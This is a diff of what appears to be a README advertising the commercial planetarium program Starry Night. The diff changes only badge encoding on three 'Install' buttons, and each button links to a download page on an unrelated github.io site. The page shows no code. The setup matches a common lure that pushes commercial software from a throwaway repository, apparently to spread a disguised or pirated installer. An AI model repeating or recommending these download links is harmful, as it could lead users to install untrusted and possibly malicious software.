@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Starry Night](https://img.shields.io/badge/⬇_Install_Starry%20Night-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Starry Night](https://img.shields.io/badge/⬇_Install_Starry+Night-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Starry Night is a commercial planetarium software with decades of heritage used 
 
 <div align="center">
 
-[![⬇ Install Starry Night](https://img.shields.io/badge/⬇_Install_Starry%20Night-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Starry Night](https://img.shields.io/badge/⬇_Install_Starry+Night-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Starry Night is a commercial planetarium software with decades of heritage used 
 
 <div align="center">
 
-[![⬇ Install Starry Night](https://img.shields.io/badge/⬇_Install_Starry%20Night-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Starry Night](https://img.shields.io/badge/⬇_Install_Starry+Night-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
